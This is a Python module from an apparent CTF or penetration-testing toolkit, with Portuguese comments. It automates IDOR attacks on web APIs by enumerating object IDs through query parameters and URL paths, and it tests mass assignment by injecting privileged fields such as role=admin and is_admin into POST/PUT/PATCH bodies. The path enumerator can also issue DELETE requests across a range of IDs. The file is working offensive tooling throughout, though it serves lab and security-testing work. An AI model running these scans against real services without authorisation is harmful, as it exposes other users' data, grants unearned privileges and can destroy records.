"""
modules/idor.py — IDOR / Parameter Tampering / Mass Assignment.

Mass assignment agora suporta POST, PUT e PATCH — cobre APIs REST reais
onde update é sempre PUT/PATCH, não POST.
"""

from __future__ import annotations

from rich.console import Console
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn

from ctflab.core import http as H
from ctflab.core.session import Session
from ctflab.cli.menu import run_menu
from ctflab.cli.ui import ask, ask_int, askctx, ask_json_interactive, scan_table

from ctflab.core.scanner import BaseScanner
from ctflab.core.models import ScanResult


class IDORScanner(BaseScanner):
    """Scanner automatizado de IDOR via Query Params."""
    name = "idor_query_params"
    capabilities = ["http", "idor", "detection"]

    def __init__(self, ctx, path: str = "/api/user", param: str = "id", start: int = 1, end: int = 10):
        super().__init__(ctx)
        self.path = path
        self.param = param
        self.start = start
        self.end = end

    def get_payloads(self) -> Iterable[int]:
        return range(self.start, self.end + 1)

    def execute(self, payload: int) -> Any:
        return H.get(self.ctx.session, self.path, params={self.param: payload})

    def analyze(self, payload: int, response: Any) -> ScanResult:
        hit, reason = _is_interesting(response.text)
        if hit or response.status_code == 200:
            return ScanResult(
                success=True,
                confidence=0.8,
                details=f"ID={payload} | {reason}",
                severity="Medium"
            )
        return ScanResult(success=False, confidence=0.0, details="-")


class MassAssignmentScanner(BaseScanner):
    """Scanner automatizado de Mass Assignment."""
    name = "mass_assignment"
    capabilities = ["http", "idor", "detection"]

    INJECTIONS = [
        {"role": "admin"}, {"admin": True}, {"is_admin": 1}, {"verified": True}
    ]

    def __init__(self, ctx, path: str = "/api/user/update", method: str = "PUT"):
        super().__init__(ctx)
        self.path = path
        self.method = method

    def get_payloads(self) -> Iterable[dict]:
        return self.INJECTIONS

    def execute(self, payload: dict) -> Any:
        return H.request(self.ctx.session, self.method, self.path, payload=payload)

    def analyze(self, payload: dict, response: Any) -> ScanResult:
        hit, _ = _is_interesting(response.text)
        if hit and response.status_code == 200:
            return ScanResult(
                success=True,
                confidence=0.9,
                details=f"Campo aceito: {payload}",
                severity="High"
            )
        return ScanResult(success=False, confidence=0.0, details="-")


_INTERESTING_KEYWORDS = [
    "admin", "root", "flag", "secret", "token", "password",
    "email", "role", "privilege", "enabled",
]


def _is_interesting(body: str, baseline_len: int = 0) -> tuple[bool, str]:
    bl = body.lower()
    for kw in _INTERESTING_KEYWORDS:
        if kw in bl:
            return True, f"keyword:{kw}"
    if baseline_len > 0 and abs(len(body) - baseline_len) > 60:
        return True, f"Δsize:{len(body)-baseline_len:+d}"
    return False, ""


def _enum_query_param(s: Session, c: Console) -> None:
    path   = askctx(s, "path",       "path",           "/api/user")
    param  = askctx(s, "idor_param", "parâmetro de ID", "id")
    start  = ask_int("ID inicial", 1)
    end    = ask_int("ID final",   20)
    method = ask("método (get/post)", "get").lower()

    c.print("[dim]tirando baseline com ID=0...[/dim]")
    try:
        with H.make_client(s) as cl:
            bl_r     = cl.get(path, params={param: 0}) if method == "get" else cl.post(path, json={param: 0})
            baseline = len(bl_r.text)
    except Exception:
        baseline = 0

    table = scan_table(f"IDOR — {param} {start}..{end}", ["id", "status", "Δsize", "motivo", "resposta"])
    hits  = 0
    total = end - start + 1

    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), console=c) as prog:
        task = prog.add_task(f"explorando {param}", total=total)
        with H.make_client(s) as cl:
            for i in range(start, end + 1):
                try:
                    prog.update(task, description=f"testando {param}={i}", advance=1)
                    r       = cl.get(path, params={param: i}) if method == "get" else cl.post(path, json={param: i})
                    code    = r.status_code
                    delta   = len(r.text) - baseline
                    hit, reason = _is_interesting(r.text, baseline)
                    snippet = r.text[:60].replace("\n", " ")
                    style   = "ok" if code == 200 else ("warn" if code in (403, 401) else "dim")
                    if hit or code == 200:
                        hits += 1
                        s.note(f"IDOR [{code}]: {param}={i} ({reason})")
                        table.add_row(
                            str(i),
                            f"[{style}]{code}[/{style}]",
                            f"{delta:+d}",
                            f"[ok]{reason}[/ok]" if reason else "-",
                            snippet,
                        )
                except Exception as exc:
                    table.add_row(str(i), "[fail]ERR[/fail]", "0", "exception", str(exc)[:40])

    c.print(table)
    c.print(f"\n[ok]{hits} ID(s) interessante(s)[/ok]")


def _enum_path(s: Session, c: Console) -> None:
    base_path = askctx(s, "base_path", "path base (sem ID)", "/api/user")
    start     = ask_int("ID inicial", 1)
    end       = ask_int("ID final",   20)
    method    = ask("método (get/post/delete)", "get").lower()

    table = scan_table(f"IDOR path — {base_path}/ID", ["id", "status", "motivo", "resposta"])
    hits  = 0
    total = end - start + 1

    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), console=c) as prog:
        task = prog.add_task("explorando path", total=total)
        with H.make_client(s) as cl:
            for i in range(start, end + 1):
                full = f"{base_path.rstrip('/')}/{i}"
                try:
                    prog.update(task, description=f"testando {full}", advance=1)
                    if method == "delete":
                        r = cl.request("DELETE", full)
                    elif method == "post":
                        r = cl.post(full, json={})
                    else:
                        r = cl.get(full)
                    code    = r.status_code
                    hit, reason = _is_interesting(r.text)
                    snippet = r.text[:55].replace("\n", " ")
                    style   = "ok" if code == 200 else ("warn" if code in (403, 401) else "dim")
                    if hit or code == 200:
                        hits += 1
                        s.note(f"IDOR path [{code}]: {full} ({reason})")
                        table.add_row(str(i), f"[{style}]{code}[/{style}]", f"[ok]{reason}[/ok]" if reason else "-", snippet)
                except Exception as exc:
                    table.add_row(str(i), "[fail]ERR[/fail]", "exception", str(exc)[:40])

    c.print(table)
    c.print(f"\n[ok]{hits} resposta(s) interessante(s)[/ok]")


def _mass_assignment(s: Session, c: Console) -> None:
    """
    Mass Assignment — injeta campos privilegiados no body.

    Suporta POST, PUT e PATCH — cobre APIs REST onde update usa PUT/PATCH.
    """
    path   = askctx(s, "path", "path", "/api/user/update")
    method = ask("método HTTP (post/put/patch)", "put").upper()
    if method not in ("POST", "PUT", "PATCH"):
        c.print("[fail]método inválido — use post, put ou patch[/fail]")
        return

    c.print("\n[dim]construa o payload base (campos normais que você já tem)[/dim]")
    base = ask_json_interactive(c)
    if not base:
        # permite payload vazio para endpoints que não precisam de body base
        base = {}

    injections = [
        {"role": "admin"},
        {"role": "administrator"},
        {"admin": True},
        {"admin": 1},
        {"is_admin": True},
        {"is_admin": 1},
        {"privilege": "admin"},
        {"level": 0},
        {"group": "admin"},
        {"permissions": ["admin"]},
        {"verified": True},
        {"active": True},
    ]

    table = scan_table("Mass Assignment", ["campo injetado", "método", "status", "hit?", "resposta"])
    hits  = 0

    with H.make_client(s) as cl:
        for inj in injections:
            payload   = {**base, **inj}
            field_str = ", ".join(f"{k}={v}" for k, v in inj.items())
            try:
                r       = cl.request(method, path, json=payload)
                code    = r.status_code
                hit, _  = _is_interesting(r.text)
                hit     = hit and code == 200
                style   = "ok" if hit else ("warn" if code == 200 else "dim")
                hit_str = "[ok]sim[/ok]" if hit else "[fail]não[/fail]"
                snippet = r.text[:55].replace("\n", " ")
                if hit:
                    hits += 1
                    s.note(f"Mass assignment [{method}]: {inj} → {snippet}")
            except Exception as exc:
                code, style, hit_str, snippet = 0, "fail", "-", str(exc)[:40]

            table.add_row(field_str, method, f"[{style}]{code}[/{style}]", hit_str, snippet)

    c.print(table)
    if hits:
        c.print(f"\n[ok]{hits} campo(s) aceito(s) — possível Mass Assignment![/ok]")
    else:
        c.print("\n[dim]nenhum campo privilegiado aceito com sinal visível[/dim]")
        c.print("[dim]tente mudar o método (post/put/patch) e o path[/dim]")


_OPTIONS = {
    "1": ("enumeração via query param (?id=N)",  _enum_query_param),
    "2": ("enumeração via path (/resource/N)",   _enum_path),
    "3": ("mass assignment (POST/PUT/PATCH)",     _mass_assignment),
    "0": ("voltar",                              None),
}


def run(session: Session, console: Console) -> None:
    console.rule("[head]IDOR / PARAMETER TAMPERING[/head]")
    console.print(
        "[dim]Testa acesso a objetos de outros usuários variando IDs e injetando "
        "campos privilegiados no payload.[/dim]\n"
    )
    run_menu("IDOR", _OPTIONS, session, console)
